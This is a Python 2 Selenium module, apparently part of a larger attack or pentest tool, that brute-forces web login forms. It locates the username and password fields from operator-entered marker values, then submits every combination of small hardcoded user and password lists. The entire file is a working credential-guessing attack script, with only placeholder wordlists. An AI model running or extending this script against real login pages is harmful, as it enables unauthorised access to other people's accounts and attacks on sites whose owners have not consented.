from selenium.common.exceptions import WebDriverException

class BruteLoginCommands:
	def __init__(self, webdriver):
		self.version = 0.1
		self.driver = webdriver
		
	def start_brute_force(self):
		raw_input("Enter nukeuser into username field amd nukepass into password field then press ENTER to continue")
		
		username_field_id = ''
		password_field_id = ''
		login_url = self.driver.current_url
		
		username_htmlfield = self.driver.find_elements_by_xpath("//input")
		for x in username_htmlfield:
			try:				
				if x.get_attribute('value') == 'nukeuser':
					username_field_id = x.get_attribute('id')

				if x.get_attribute('value') == 'nukepass':
					password_field_id = x.get_attribute('id')
			except:
				pass
		print ''
		print "Username field is "+username_field_id
		print "Password field is "+password_field_id
		
		runscan = True
		if username_field_id == '':
			runscan = False
			print "No username field found!"
			
		if password_field_id == '':
			runscan = False
			print "No password field found!"
		
		
		if runscan:
			self.try_logins(login_url, username_field_id, password_field_id)
		else:
			print "Could not brute force login page! no username or password field found!"

		print ''
		print ''
		raw_input("Press ENTER to return to menu.")
	
	def try_logins(self, loginurl, userfield, passfield):
		users=['bert', 'jimmyj']
		passwords = ['password1', 'password2']
		
		for current_user in users:
			for current_password in passwords:
				self.driver.get(loginurl)
				username_html_field = self.driver.find_element_by_id(userfield)
				password_html_field = self.driver.find_element_by_id(passfield)
				username_html_field.send_keys(current_user)
				password_html_field.send_keys(current_password)
				password_html_field.submit()
				
		
	
